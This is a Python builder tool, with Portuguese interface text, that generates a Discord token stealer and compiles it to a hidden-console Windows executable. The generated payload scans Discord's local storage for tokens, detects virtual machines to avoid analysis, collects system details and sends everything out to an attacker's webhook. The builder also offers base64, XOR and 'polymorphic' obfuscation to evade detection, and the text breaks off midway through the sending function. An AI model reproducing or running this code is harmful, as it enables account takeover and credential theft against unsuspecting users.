#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import json
import re
import shutil
import hashlib
import platform
import subprocess
from typing import Dict, List, Optional
from pathlib import Path

# Interface colorida no terminal
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.text import Text
from rich.syntax import Syntax
from rich.style import Style

console = Console()

class DiscordTokenStealer:
    def __init__(self):
        self.banners = [
            self._gerar_banner_discord(),
            self._gerar_banner_hacker(),
            self._gerar_banner_venom()
        ]
        
        self.tecnicas = {
            'webhook': {
                'nome': 'Webhook Discord',
                'descricao': 'Envia tokens via webhook para Discord',
                'perigo': 'alto',
                'func': self._gerar_webhook
            },
            'webhook_avancado': {
                'nome': 'Webhook Avan√ßado',
                'descricao': 'Webhook com t√©cnicas anti-detec√ß√£o',
                'perigo': 'alto',
                'func': self._gerar_webhook_avancado
            }
        }
        
        self.ofuscacoes = {
            'base64': 'Codifica√ß√£o Base64',
            'string_escape': 'Escape de Strings',
            'xor_encrypt': 'Criptografia XOR',
            'polimorfico': 'Ofusca√ß√£o Polim√≥rfica'
        }
    
    def _gerar_banner_discord(self) -> str:
        return """
[bold blue]
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£Ä‚£Ä‚£Ä‚£Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£¥‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚£¶‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢ª‚£ø‚£ø‚£ø‚£ø‚†ü‚†õ‚†õ‚†ª‚£ø‚£ø‚£ø‚£ø‚°ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚¢ø‚£ø‚°ø‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚¢ø‚£ø‚°ø‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚£∂‚£∂‚£∂‚£∂‚£¶‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£¥‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∞‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°á‚†Ä‚†Ä‚†Ä‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†á‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚†ª‚†ø‚†ø‚†ø‚†ø‚†ü‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†â‚†â‚†â‚†â‚†â‚†â‚†â‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
[/bold blue]
[bold white on blue]        DISCORD TOKEN STEALER - EXE BUILDER[/bold white on blue]
"""
    
    def _gerar_banner_hacker(self) -> str:
        return """
[bold green]
‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ  ‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñÄ‚ñà‚ñà‚ñà   ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñÑ   ‚ñà    ‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñÑ ‚ñÑ‚ñà‚ñà‚ñà‚ñì
‚ñí‚ñà‚ñà‚ñÄ ‚ñà‚ñà‚ñå‚ñí‚ñà‚ñà‚ñí  ‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà ‚ñí ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñÄ ‚ñÄ‚ñà   ‚ñà‚ñà  ‚ñì‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà‚ñí‚ñÄ‚ñà‚ñÄ ‚ñà‚ñà‚ñí
‚ñë‚ñà‚ñà   ‚ñà‚ñå‚ñí‚ñà‚ñà‚ñë  ‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà ‚ñë‚ñÑ‚ñà ‚ñí‚ñí‚ñì‚ñà    ‚ñÑ ‚ñì‚ñà‚ñà  ‚ñí‚ñà‚ñà‚ñë‚ñì‚ñà‚ñà    ‚ñì‚ñà‚ñà‚ñë
‚ñë‚ñì‚ñà‚ñÑ   ‚ñå‚ñí‚ñà‚ñà   ‚ñà‚ñà‚ñë‚ñí‚ñà‚ñà‚ñÄ‚ñÄ‚ñà‚ñÑ  ‚ñí‚ñì‚ñì‚ñÑ ‚ñÑ‚ñà‚ñà‚ñí‚ñì‚ñì‚ñà  ‚ñë‚ñà‚ñà‚ñë‚ñí‚ñà‚ñà    ‚ñí‚ñà‚ñà 
‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñì ‚ñë ‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë‚ñë‚ñà‚ñà‚ñì ‚ñí‚ñà‚ñà‚ñí‚ñí ‚ñì‚ñà‚ñà‚ñà‚ñÄ ‚ñë‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì ‚ñí‚ñà‚ñà‚ñí   ‚ñë‚ñà‚ñà‚ñí
 ‚ñí‚ñí‚ñì  ‚ñí ‚ñë ‚ñí‚ñë‚ñí‚ñë‚ñí‚ñë ‚ñë ‚ñí‚ñì ‚ñë‚ñí‚ñì‚ñë‚ñë ‚ñë‚ñí ‚ñí  ‚ñë‚ñë‚ñí‚ñì‚ñí ‚ñí ‚ñí ‚ñë ‚ñí‚ñë   ‚ñë  ‚ñë
 ‚ñë ‚ñí  ‚ñí   ‚ñë ‚ñí ‚ñí‚ñë   ‚ñë‚ñí ‚ñë ‚ñí‚ñë  ‚ñë  ‚ñí   ‚ñë‚ñë‚ñí‚ñë ‚ñë ‚ñë ‚ñë  ‚ñë      ‚ñë
 ‚ñë ‚ñë  ‚ñë ‚ñë ‚ñë ‚ñë ‚ñí    ‚ñë‚ñë   ‚ñë ‚ñë         ‚ñë‚ñë‚ñë ‚ñë ‚ñë ‚ñë      ‚ñë   
   ‚ñë        ‚ñë ‚ñë     ‚ñë     ‚ñë ‚ñë         ‚ñë            ‚ñë   
 ‚ñë                      ‚ñë                                
[/bold green]
[bold black on green]        EXE BUILDER MASTER - v3.0[/bold black on green]
"""
    
    def _gerar_banner_venom(self) -> str:
        return """
[bold red]
‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà    ‚ñà‚ñÑ   ‚ñÑ‚ñà        ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ   
‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà       ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñà‚ñà‚ñÑ 
‚ñà‚ñà‚ñà    ‚ñà‚ñÄ  ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà       ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà 
‚ñà‚ñà‚ñà        ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà       ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà 
‚ñà‚ñà‚ñà        ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà       ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà 
‚ñà‚ñà‚ñà    ‚ñà‚ñÑ  ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà       ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà 
‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñå    ‚ñÑ ‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà 
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÄ  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÄ  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ‚ñÑ‚ñà‚ñà  ‚ñÄ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÄ   ‚ñÄ‚ñà   ‚ñà‚ñÄ  
                         ‚ñÄ                            
[/bold red]
[bold white on red]        STEALER BUILDER - WINDOWS EDITION[/bold white on red]
"""
    
    def mostrar_banner(self):
        console.print(random.choice(self.banners))
        console.print(Panel.fit(
            "[blink bold red]‚ö†Ô∏è USO APENAS PARA TESTES √âTICOS! ‚ö†Ô∏è[/blink bold red]",
            style="red on black"
        ))
        time.sleep(1)
    
    def menu_principal(self):
        while True:
            console.clear()
            self.mostrar_banner()
            
            tabela = Table(
                title="[bold cyan]üéØ GERADOR DE STEALER EXE[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            tabela.add_column("Op√ß√£o", style="cyan", width=8)
            tabela.add_column("T√©cnica", style="green")
            tabela.add_column("Descri√ß√£o", style="white")
            tabela.add_column("Perigo", style="red")
            
            for i, (key, tech) in enumerate(self.tecnicas.items(), 1):
                icone_perigo = "üî•" if tech['perigo'] == 'alto' else "‚ö†Ô∏è" if tech['perigo'] == 'medio' else "üî∂"
                tabela.add_row(str(i), tech['nome'], tech['descricao'], f"{icone_perigo} {tech['perigo'].upper()}")
            
            tabela.add_row("3", "Combo Avan√ßado", "Todas t√©cnicas webhook", "üíÄ CR√çTICO")
            tabela.add_row("0", "Sair", "Encerrar programa", "üö™")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]‚û§[/blink yellow] Selecione a t√©cnica",
                choices=[str(i) for i in range(0, 4)],
                show_choices=False
            )
            
            if escolha == "1":
                self._processar_tecnica('webhook')
            elif escolha == "2":
                self._processar_tecnica('webhook_avancado')
            elif escolha == "3":
                self._processar_combo_avancado()
            elif escolha == "0":
                self._sair()
    
    def _processar_tecnica(self, tecnica: str):
        console.clear()
        tech_info = self.tecnicas[tecnica]
        
        console.print(Panel.fit(
            f"[bold red]üéØ {tech_info['nome'].upper()} [/bold red]",
            border_style="red"
        ))
        console.print(f"[cyan]Descri√ß√£o:[/cyan] {tech_info['descricao']}")
        console.print(f"[cyan]N√≠vel de perigo:[/cyan] {tech_info['perigo'].upper()}")
        
        if tech_info['perigo'] in ['alto', 'critico']:
            console.print(Panel.fit(
                "[blink bold red]‚ö†Ô∏è ALTA PERIGOSIDADE ‚ö†Ô∏è[/blink bold red]\n"
                "Esta t√©cnica pode causar roubo de identidade\n"
                "Use apenas em ambientes controlados!",
                border_style="red"
            ))
            
            if not Confirm.ask("Confirmar cria√ß√£o?", default=False):
                return
        
        config = self._configurar_webhook()
        if not config:
            return
        
        ofuscar = Confirm.ask("Aplicar t√©cnicas de ofusca√ß√£o?")
        tecnicas_ofusca = []
        if ofuscar:
            tecnicas_ofusca = self._selecionar_ofuscacoes()
        
        with Progress() as progress:
            task = progress.add_task("[red]Gerando stealer...[/red]", total=100)
            
            payload = tech_info['func'](**config)
            progress.update(task, advance=30)
            
            if ofuscar:
                for tecnica_ofusca in tecnicas_ofusca:
                    payload = self._aplicar_ofuscacao(payload, tecnica_ofusca)
                    progress.update(task, advance=20)
            
            progress.update(task, completed=100)
        
        self._preview_payload(payload)
        self._salvar_e_compilar(payload, tecnica)
    
    def _processar_combo_avancado(self):
        console.clear()
        console.print(Panel.fit(
            "[bold red]üíÄ COMBO AVAN√áADO WEBHOOK[/bold red]",
            border_style="red"
        ))
        
        console.print(Panel.fit(
            "[blink bold red]‚ò†Ô∏è PERIGO CR√çTICO - RISCOS EXTREMOS ‚ò†Ô∏è[/blink bold red]\n"
            "Esta op√ß√£o combina todas as t√©cnicas webhook!\n"
            "Pode resultar em consequ√™ncias graves!",
            border_style="red"
        ))
        
        if not Confirm.ask("Confirmar cria√ß√£o do combo avan√ßado?", default=False):
            return
        
        config = self._configurar_webhook()
        if not config:
            return
        
        ofuscar = Confirm.ask("Aplicar t√©cnicas de ofusca√ß√£o?")
        tecnicas_ofusca = []
        if ofuscar:
            tecnicas_ofusca = self._selecionar_ofuscacoes()
        
        with Progress() as progress:
            task = progress.add_task("[red]Gerando combo avan√ßado...[/red]", total=100)
            
            # Gerar payloads de ambas t√©cnicas
            payload1 = self.tecnicas['webhook']['func'](**config)
            progress.update(task, advance=25)
            
            payload2 = self.tecnicas['webhook_avancado']['func'](**config)
            progress.update(task, advance=25)
            
            # Combinar payloads
            combo_payload = self._combinar_payloads_webhook([payload1, payload2])
            progress.update(task, advance=20)
            
            if ofuscar:
                for tecnica_ofusca in tecnicas_ofusca:
                    combo_payload = self._aplicar_ofuscacao(combo_payload, tecnica_ofusca)
                    progress.update(task, advance=10)
            
            progress.update(task, completed=100)
        
        self._preview_payload(combo_payload)
        self._salvar_e_compilar(combo_payload, 'combo_avancado')
    
    def _configurar_webhook(self) -> Optional[Dict]:
        config = {}
        
        console.print(Panel.fit(
            "[bold]Configura√ß√£o Webhook[/bold]",
            border_style="blue"
        ))
        
        config['webhook_url'] = Prompt.ask(
            "[yellow]?[/yellow] URL do Webhook Discord",
            default="https://discord.com/api/webhooks/your_webhook_here"
        )
        
        config['embed_color'] = IntPrompt.ask(
            "[yellow]?[/yellow] Cor do embed (decimal)",
            default=16711680  # Red
        )
        
        config['ping_user'] = Confirm.ask(
            "[yellow]?[/yellow] Pingar usu√°rio no webhook?",
            default=False
        )
        
        config['anti_vm'] = Confirm.ask(
            "[yellow]?[/yellow] Adicionar detec√ß√£o de VM?",
            default=True
        )
        
        config['fake_error'] = Confirm.ask(
            "[yellow]?[/yellow] Mostrar erro falso ap√≥s execu√ß√£o?",
            default=False
        )
        
        console.print("\n[bold]Resumo da configura√ß√£o:[/bold]")
        for chave, valor in config.items():
            console.print(f"  [cyan]{chave}:[/cyan] {valor}")
        
        if not Confirm.ask("Confirmar configura√ß√µes?"):
            return None
        
        return config
    
    def _selecionar_ofuscacoes(self) -> List[str]:
        console.print("\n[bold]T√©cnicas de ofusca√ß√£o dispon√≠veis:[/bold]")
        tabela = Table(show_header=True, header_style="bold magenta")
        tabela.add_column("ID", style="cyan", width=5)
        tabela.add_column("T√©cnica", style="green")
        tabela.add_column("Dificuldade", style="yellow")
        
        dificuldades = {
            'base64': "F√°cil",
            'string_escape': "M√©dio", 
            'xor_encrypt': "Dif√≠cil",
            'polimorfico': "Extremo"
        }
        
        for i, (codigo, desc) in enumerate(self.ofuscacoes.items(), 1):
            tabela.add_row(str(i), desc, dificuldades.get(codigo, "Desconhecida"))
        
        console.print(tabela)
        
        escolhas = Prompt.ask(
            "[yellow]?[/yellow] Selecione as t√©cnicas (separadas por v√≠rgula)",
            default="1,2"
        )
        
        return [list(self.ofuscacoes.keys())[int(x)-1] for x in escolhas.split(',')]
    
    def _aplicar_ofuscacao(self, payload: str, tecnica: str) -> str:
        if tecnica == 'base64':
            return self._ofuscar_base64(payload)
        elif tecnica == 'string_escape':
            return self._ofuscar_string_escape(payload)
        elif tecnica == 'xor_encrypt':
            return self._ofuscar_xor(payload)
        elif tecnica == 'polimorfico':
            return self._ofuscar_polimorfico(payload)
        return payload
    
    def _ofuscar_base64(self, payload: str) -> str:
        encoded = base64.b64encode(payload.encode()).decode()
        return f"import base64; exec(base64.b64decode('{encoded}').decode())"
    
    def _ofuscar_string_escape(self, payload: str) -> str:
        escaped = payload.encode('unicode_escape').decode()
        return f"exec('{escaped}')"
    
    def _ofuscar_xor(self, payload: str) -> str:
        key = random.randint(1, 255)
        xor_encoded = ''.join(chr(ord(c) ^ key) for c in payload)
        xor_encoded_b64 = base64.b64encode(xor_encoded.encode()).decode()
        
        return f"""import base64
key = {key}
data = base64.b64decode('{xor_encoded_b64}').decode()
exec(''.join(chr(ord(c) ^ key) for c in data))"""
    
    def _ofuscar_polimorfico(self, payload: str) -> str:
        # Dividir o payload em partes
        parts = []
        chunk_size = len(payload) // 3
        for i in range(0, len(payload), chunk_size):
            part = payload[i:i+chunk_size]
            parts.append(base64.b64encode(part.encode()).decode())
        
        # Gerar vari√°veis aleat√≥rias
        var_names = [f"v{random.randint(1000,9999)}" for _ in range(4)]
        
        code = f"""# Vari√°veis de ofusca√ß√£o
{var_names[0]} = {random.randint(100,999)}
{var_names[1]} = "{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}"
{var_names[2]} = ["""
        
        for part in parts:
            code += f'"{part}", '
        code = code.rstrip(', ') + ']\n'
        
        code += f"""# Reconstru√ß√£o do c√≥digo
{var_names[3]} = ''.join([base64.b64decode(p).decode() for p in {var_names[2]}])
exec({var_names[3]})"""
        
        return f"import base64\n{code}"
    
    def _combinar_payloads_webhook(self, payloads: List[str]) -> str:
        combined = """# COMBINED DISCORD TOKEN STEALER - WEBHOOK EDITION
# Advanced exfiltration techniques

import os
import sys
import json
import base64
import requests
import re
import platform
import subprocess
from pathlib import Path

"""
        
        # Adicionar cada payload com separadores
        for i, payload in enumerate(payloads, 1):
            combined += f"\n# Technique {i}\n"
            # Extrair apenas a parte funcional (remover imports duplicados)
            lines = payload.split('\n')
            func_lines = [line for line in lines if not line.startswith('import ') and not line.startswith('from ')]
            combined += '\n'.join(func_lines) + '\n'
        
        return combined
    
    def _preview_payload(self, payload: str):
        console.print(Panel.fit(
            "[bold]PR√â-VISUALIZA√á√ÉO DO PAYLOAD[/bold]",
            border_style="yellow"
        ))
        
        lines = payload.split('\n')[:20]
        preview = '\n'.join(lines)
        
        console.print(Syntax(preview, "python", theme="monokai"))
        
        if len(payload.split('\n')) > 20:
            console.print("[yellow]... (mostrando primeiras 20 linhas)[/yellow]")
        
        console.print(f"[cyan]Tamanho total:[/cyan] {len(payload)} caracteres, {len(payload.splitlines())} linhas")
    
    def _salvar_e_compilar(self, payload: str, nome_tecnica: str):
        nome_arquivo_py = Prompt.ask(
            "[yellow]?[/yellow] Nome do arquivo Python",
            default=f"discord_stealer_{nome_tecnica}.py"
        )
        
        try:
            # Salvar arquivo Python
            with open(nome_arquivo_py, 'w', encoding='utf-8') as f:
                f.write(payload)
            
            # Calcular hashes
            with open(nome_arquivo_py, 'rb') as f:
                md5 = hashlib.md5(f.read()).hexdigest()
                f.seek(0)
                sha256 = hashlib.sha256(f.read()).hexdigest()
            
            console.print(Panel.fit(
                f"[green]‚úì Salvo como [bold]{nome_arquivo_py}[/bold][/green]\n"
                f"[cyan]MD5:[/cyan] [bold]{md5}[/bold]\n"
                f"[cyan]SHA256:[/cyan] [bold]{sha256}[/bold]",
                title="[bold green]SUCESSO[/bold green]",
                border_style="green"
            ))
            
            # Compilar para EXE
            if Confirm.ask("Compilar para execut√°vel Windows (.exe)?"):
                self._compilar_para_exe(nome_arquivo_py)
        
        except Exception as e:
            console.print(Panel.fit(
                f"[red]‚úó Erro: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
        
        input("\nPressione Enter para continuar...")
    
    def _compilar_para_exe(self, arquivo_py: str):
        console.print(Panel.fit(
            "[bold]üîß COMPILA√á√ÉO PARA EXECUT√ÅVEL WINDOWS[/bold]",
            border_style="blue"
        ))
        
        # Verificar se pyinstaller est√° instalado
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], 
                         check=True, capture_output=True)
        except:
            console.print("[yellow]Aviso: N√£o foi poss√≠vel instalar pyinstaller[/yellow]")
        
        nome_exe = Prompt.ask(
            "[yellow]?[/yellow] Nome do execut√°vel",
            default=arquivo_py.replace('.py', '.exe')
        )
        
        opcoes_compilacao = [
            "--onefile",
            "--noconsole",
            "--hidden-import=requests",
            "--hidden-import=json",
            "--hidden-import=re",
            "--hidden-import=base64",
            "--hidden-import=platform",
            "--hidden-import=subprocess",
            "--hidden-import=pathlib"
        ]
        
        if Confirm.ask("Ocultar janela do console?"):
            opcoes_compilacao.append("--windowed")
        
        if Confirm.ask("Adicionar √≠cone personalizado?"):
            icone = Prompt.ask("[yellow]?[/yellow] Caminho do arquivo .ico")
            if os.path.exists(icone):
                opcoes_compilacao.append(f"--icon={icone}")
        
        comando = [sys.executable, "-m", "PyInstaller"] + opcoes_compilacao + [arquivo_py, "--name", nome_exe.replace('.exe', '')]
        
        console.print(f"[cyan]Comando:[/cyan] {' '.join(comando)}")
        
        with Progress() as progress:
            task = progress.add_task("[red]Compilando execut√°vel...[/red]", total=100)
            
            try:
                resultado = subprocess.run(comando, capture_output=True, text=True)
                progress.update(task, completed=100)
                
                if resultado.returncode == 0:
                    # Encontrar arquivo compilado
                    dist_dir = "dist"
                    if os.path.exists(dist_dir):
                        exe_path = os.path.join(dist_dir, nome_exe)
                        if os.path.exists(exe_path):
                            # Calcular tamanho
                            tamanho = os.path.getsize(exe_path) / (1024 * 1024)  # MB
                            
                            console.print(Panel.fit(
                                f"[green]‚úì Execut√°vel criado: [bold]{exe_path}[/bold][/green]\n"
                                f"[cyan]Tamanho:[/cyan] {tamanho:.2f} MB\n"
                                f"[cyan]Arquivo:[/cyan] {nome_exe}",
                                title="[bold green]COMPILA√á√ÉO BEM-SUCEDIDA[/bold green]",
                                border_style="green"
                            ))
                        else:
                            console.print("[yellow]Arquivo EXE n√£o encontrado na pasta dist/[/yellow]")
                    else:
                        console.print("[yellow]Pasta dist/ n√£o encontrada[/yellow]")
                else:
                    console.print(Panel.fit(
                        f"[red]‚úó Erro na compila√ß√£o:[/red]\n{resultado.stderr}",
                        title="[bold red]ERRO DE COMPILA√á√ÉO[/bold red]",
                        border_style="red"
                    ))
            
            except Exception as e:
                console.print(Panel.fit(
                    f"[red]‚úó Erro: {str(e)}[/red]",
                    title="[bold red]ERRO[/bold red]",
                    border_style="red"
                ))
    
    def _gerar_webhook(self, webhook_url: str, embed_color: int, ping_user: bool, anti_vm: bool, fake_error: bool, **kwargs) -> str:
        return f'''import os
import sys
import json
import requests
import re
import platform
import subprocess
from pathlib import Path

class DiscordTokenStealer:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.tokens_found = []
        
    def is_virtual_machine(self):
        """Detecta se est√° rodando em VM"""
        try:
            # Verificar processos comuns de VM
            vm_processes = ["vboxservice", "vmware-tools", "vmtoolsd", "xenservice"]
            output = subprocess.check_output("tasklist", shell=True, text=True).lower()
            
            for process in vm_processes:
                if process in output:
                    return True
                    
            # Verificar hardware
            if platform.processor().lower() in ["virtual", "vmware", "virtualbox"]:
                return True
                
            # Verificar nomes de m√°quina
            computer_name = os.getenv("COMPUTERNAME", "").lower()
            if any(x in computer_name for x in ["vm", "virtual", "test", "sandbox"]):
                return True
                
        except:
            pass
            
        return False

    def find_discord_paths(self):
        """Encontra todos os caminhos poss√≠veis do Discord"""
        paths = []
        appdata = os.getenv('APPDATA')
        localappdata = os.getenv('LOCALAPPDATA')
        
        discord_versions = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']
        
        for version in discord_versions:
            # Caminhos principais
            paths.extend([
                os.path.join(appdata, version),
                os.path.join(localappdata, version),
            ])
            
            # Caminhos de LevelDB
            leveldb_paths = [
                os.path.join(appdata, version, 'Local Storage', 'leveldb'),
                os.path.join(localappdata, version, 'Local Storage', 'leveldb'),
            ]
            
            for path in leveldb_paths:
                if os.path.exists(path):
                    paths.append(path)
                    
        return [p for p in paths if os.path.exists(p)]

    def extract_tokens_from_file(self, file_path):
        """Extrai tokens de um arquivo espec√≠fico"""
        tokens = []
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                
            # Padr√µes de token Discord
            patterns = [
                r'[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}',
                r'mfa\\.[\\w-]{{84}}'
            ]
            
            for pattern in patterns:
                found = re.findall(pattern, content)
                tokens.extend(found)
                
        except Exception as e:
            pass
            
        return tokens

    def search_for_tokens(self):
        """Busca por tokens em todos os locais poss√≠veis"""
        all_tokens = []
        
        # Buscar em arquivos do Discord
        discord_paths = self.find_discord_paths()
        
        for path in discord_paths:
            if os.path.isdir(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith(('.ldb', '.log', '.dat')):
                            file_path = os.path.join(root, file)
                            tokens = self.extract_tokens_from_file(file_path)
                            all_tokens.extend(tokens)
        
        # Remover duplicatas
        return list(set(all_tokens))

    def get_system_info(self):
        """Coleta informa√ß√µes do sistema"""
        try:
            computer_name = os.getenv('COMPUTERNAME', 'N/A')
            username = os.getenv('USERNAME', 'N/A')
            hostname = platform.node()
            processor = platform.processor()
            system = platform.system()
            version = platform.version()
            
            return {{
                "computer_name": computer_name,
                "username": username,
                "hostname": hostname,
                "processor": processor,
                "system": system,
                "version": version
            }}
        except:
            return {{"error": "Could not gather system info"}}

    def send_to_webhook(self, tokens, embed_color=16711680, ping=False):
        """Envia tokens para webhook do Discord"""
        if not tokens:
            return False
            
        system_info = self.get_system_info()
        
        embed = {{
            "title": "üîë Discord Tokens Captured",
            "color": embed_color,
            "fields": [
                {{
                    "name": "üíª Computer Name",
                    "value": f"```{{system_info.get('computer_name', 'N/A')}}```",
                    "inline": True
                }},
                {{
                    "name": "üë§ Username", 
                    "value": f"```{{system_info.get('username', 'N/A')}}```",
                    "inline": True
                }},
                {{
                    "name": "üî¢ Tokens Found",
                    "value": f"```{{len(tokens)}}```",
                    "inline": True
                }},
                {{
                    "name": "üñ•Ô∏è System",
                    "value": f"```{{system_info.get('system', 'N/A')}} {{system_info.get('version', '')}}```",
                    "inline": False
                }}
            ],
            "footer": {{
                "text": "Token Stealer ‚Ä¢ {time.strftime('%Y-%m-%d %H:%M:%S')}"
            }}
        }}
        
        # Adicionar tokens aos fields
